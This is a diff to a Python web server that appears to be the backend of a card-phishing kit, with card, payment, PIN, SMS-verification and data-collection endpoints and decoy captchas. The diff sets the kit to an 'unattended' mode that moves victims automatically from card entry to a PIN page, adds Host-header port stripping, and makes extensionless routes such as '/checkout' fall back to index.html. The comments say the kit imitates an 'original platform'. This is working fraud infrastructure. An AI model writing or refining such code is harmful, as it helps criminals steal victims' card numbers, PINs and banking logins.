@@ -1087,6 +1087,11 @@ def now_text() -> str:
     return datetime.now().astimezone().isoformat(timespec="seconds")
 
 
+def host_only(value: str) -> str:
+    """去掉 Host 头里的端口，便于反代/多端口部署时仍能匹配域名。"""
+    return (value or "").split(":", 1)[0].strip().lower()
+
+
 def json_dumps(value) -> bytes:
     return json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
 
@@ -2473,9 +2478,11 @@ def kit_check_reply(site_code: str) -> dict:
         "title": "",
         "content": "",
         "payment_content": "",
-        "synchronous_control": "1",
+        # 无人值守：ac1=1 → 提交卡后自动跳 PIN；ac1=2 → OB；其他 → thanks
+        # synchronous_control=0 才会触发自动推进
+        "synchronous_control": "0",
         "jump_address": "",
-        "ac1": "",
+        "ac1": "1",
         "price": "",
         "s1": "",
         "card_error_msg": "",
@@ -2680,7 +2687,7 @@ class Handler(BaseHTTPRequestHandler):
                 return self.serve_public("/" + remainder, domain_row)
             finally:
                 self._preview_host = None
-        public_domain = STORE.domain(self.headers.get("Host", ""))
+        public_domain = STORE.domain(host_only(self.headers.get("Host", "")))
         if public_domain:
             # Verification routes and their assets must stay reachable,
             # otherwise a visitor could never complete the challenge.
@@ -2781,7 +2788,7 @@ class Handler(BaseHTTPRequestHandler):
     def ws_channel(self):
         """最小 WebSocket 通道：记录客户端首帧，用于对齐原平台的握手协议。"""
         key = self.headers.get("Sec-WebSocket-Key", "")
-        domain_row = STORE.domain(self.headers.get("Host", "")) or {}
+        domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or {}
         project = STORE.project(domain_row.get("project_id")) if domain_row.get("project_id") else None
         site_code = str((project or {}).get("slug") or "")
         self.send_response(101, "Switching Protocols")
@@ -2873,7 +2880,7 @@ class Handler(BaseHTTPRequestHandler):
                 or path.endswith("/api/client/visit")
             )
         )
-        if STORE.domain(self.headers.get("Host", "")) and path not in (
+        if STORE.domain(host_only(self.headers.get("Host", ""))) and path not in (
             "/track/visit", "/track/click", "/__client/env", "/collect",
             "/api/client/postData", "/api/client/visit") and not is_captcha_post and not is_flow_post:
             return self.json(404, {"error": "request failed"})
@@ -2906,7 +2913,7 @@ class Handler(BaseHTTPRequestHandler):
             preview_host = self._preview_host
             if not preview_host:
                 preview_host = unquote(path[len("/__preview/"):].split("/", 1)[0]).strip()
-            domain_row = STORE.domain(self.headers.get("Host", "")) or (
+            domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
                 STORE.domain(preview_host) if preview_host else None
             )
             if not domain_row:
@@ -3304,7 +3311,7 @@ class Handler(BaseHTTPRequestHandler):
         The login page calls this over fetch before navigating on, so the step
         order is enforced by the server rather than by the page's own links.
         """
-        domain_row = STORE.domain(self.headers.get("Host", "")) or (
+        domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
             STORE.domain(self._preview_host) if self._preview_host else None
         )
         if not domain_row:
@@ -3495,7 +3502,7 @@ class Handler(BaseHTTPRequestHandler):
         """Dispatch the verification endpoints and their static images."""
         if path in ("/captcha/security.png", "/captcha/captcha-decoy.png"):
             return self.serve_captcha_asset(path.rsplit("/", 1)[-1])
-        domain_row = STORE.domain(self.headers.get("Host", "")) or (
+        domain_row = STORE.domain(host_only(self.headers.get("Host", ""))) or (
             STORE.domain(self._preview_host) if self._preview_host else None
         )
         if not domain_row:
@@ -3830,7 +3837,9 @@ class Handler(BaseHTTPRequestHandler):
             # 通常并没有这个文件（原平台也是服务端伪装出来的）。命中入口就回落到
             # index.html，URL 保留伪装后缀，响应仍按 HTML 输出，不再 404 白屏。
             fallback = (root / "index.html").resolve()
-            if relative == entry and fallback.is_file():
+            last = relative.rsplit("/", 1)[-1]
+            is_route = "." not in last  # /checkout、/sms-verification 这类 SPA 路由没有扩展名
+            if (relative == entry or is_route) and fallback.is_file():
                 file_path = fallback
                 is_document = True
             else:
